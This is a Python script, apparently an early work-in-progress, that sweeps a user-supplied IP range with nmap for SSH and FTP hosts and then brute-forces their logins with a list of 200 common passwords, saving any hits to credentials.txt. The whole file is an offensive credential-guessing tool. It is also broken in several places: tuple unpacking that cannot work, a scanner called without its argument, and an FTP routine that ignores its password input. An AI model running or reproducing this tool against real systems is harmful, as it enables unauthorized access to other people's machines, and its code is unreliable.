#!/usr/bin/env python3
from sre_parse import State
import nmap
import ipaddress
import re
import paramiko
from colorama import init, Fore
import time
import socket
import ftplib
from threading import Thread
import queue
import sys

# Colors
init()

GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

# Initialize Queue
q = queue.Queue()

# Number of threads (keep around 4 to prevent getting kicked out of connection as fast)
number_threads = 4

# 21 = FTP, 22 = SSH, 23 = Telnet
ports = {21, 22, 23}



def ssh_scanner_and_grabber(ip_range):
    # -v = Verbose, -sP = Skip normal port scan, -PE = ICMP Echo, -PA = Workaround SYN scan
    # Using nmap port scanner
    hostname_list = []
    scanner = nmap.PortScanner()
    scanner.scan(hosts=ip_range, arguments='-v -sP -PE -PA22')
    hosts_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts()]
    for host, status, state in hosts_list:
        if status == 'up' and state == 'open' and len(hosts_list) > 0:
            #print('{0}:{1}'.format(host, status))
            hostname_list.append(host)
    if len(hostname_list) > 0:
        print(f'{GREEN}Found potentially vulnerable ssh hosts:{RESET}')
        print(hostname_list)
    else:
        print(f'{RED}No hosts found with open ssh ports{RESET}')
    return (hostname_list)



def ftp_scanner_and_grabber(ip_range):
    # -v = Verbose, -sP = Skip normal port scan, -PE = ICMP Echo, -PA = Workaround SYN scan
    # Using nmap port scanner
    hostname_list = []
    scanner = nmap.PortScanner()
    scanner.scan(hosts=ip_range, arguments='-v -sP -PE -PA21')
    hosts_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts()]
    for host, status, state in hosts_list:
        if status == 'up' and state == 'open' and len(hosts_list) > 0:
            #print('{0}:{1}'.format(host, status))
            hostname_list.append(host)
    if len(hostname_list) > 0:
        print(f'{GREEN}Found potentially vulnerable ftp hosts:{RESET}')
        print(hostname_list)
    else:
        print(f'{RED}No hosts found with open ftp ports{RESET}')
    return (hostname_list)



def is_ssh_open(hostname, username, password):
    # Initialize SSH client
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, port=22, timeout=3)
    except socket.timeout:
        print(f'{RED}Host: {hostname} is unreachable, timed out. {RESET}')
        return False
    except paramiko.AuthenticationException:
        print(f'Invalid credentials for {username}:{password}')
        return False
    except paramiko.SSHException:
        print(f"{BLUE}Quota exceeded, retrying after a minute...{RESET}")
        # Sleep for a minute, may later dynamically change due to different exceptions
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f'{GREEN}Successful brute force on {hostname} with Username: {username} and Password: {password}{RESET}')
        return True



def is_ftp_open(hostname, username, password):
    global q
    while True:
        password = q.get()
        server = ftplib.FTP()
        print(f'{MAGENTA}Trying {password}{RESET}')
        try:
            server.connect(hostname, port=21, timeout=5)
            server.login(username, password)
        except ftplib.error_perm:
            # Bad creds
            pass
        else:
            # Good creds
            print(f'{GREEN}Found FTP credentials: {username}:{password}{RESET}')
            # Clear queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
            return True
        finally:
            q.task_done()



# def is_telnet_open(hostname, username, password):



def main():
    # Username for now, will switch over to a list later
    user = 'test'

    # Location of password file
    passlist = open('2020-200_most_used_passwords.txt').read().splitlines()

    # Need to ask user for input of an ip or ip range (do ifconfig to figure it out first)
    print(f'{BLUE}Enter IP or IP Range, Ex: 192.168.1.0/24{RESET}')
    ip = input()

    # SSH Portion
    print(f'{MAGENTA}Scanning Network for vulnerable SSH Hosts{RESET}')
    ssh_hostname_list = ssh_scanner_and_grabber(ip)
    if len(ssh_hostname_list) > 0:
        print(f'{MAGENTA}Now testing hosts for weak SSH credentials{RESET}')
        for ip in ssh_hostname_list:
            for password in passlist:
                if is_ssh_open(ip, user, password):
                    open('credentials.txt', 'w').write(f'SSH:{user}@{ip}:{password}')

    # FTP Portion
    print(f'{MAGENTA}Scanning Network for vulnerable FTP Hosts{RESET}')
    ftp_hostname_list = ftp_scanner_and_grabber()
    if len(ftp_hostname_list) > 0:
        print(f'{MAGENTA}Now testing hosts for weak FTP credentials{RESET}')
        for ip in ftp_hostname_list:
            for password in passlist:
                if is_ftp_open(ip, user, password):
                    open('credentials.txt', 'w').write(f'FTP:{user}@{ip}:{password}')

    # Telnet Portion

if __name__ == "__main__":
    sys.exit(main())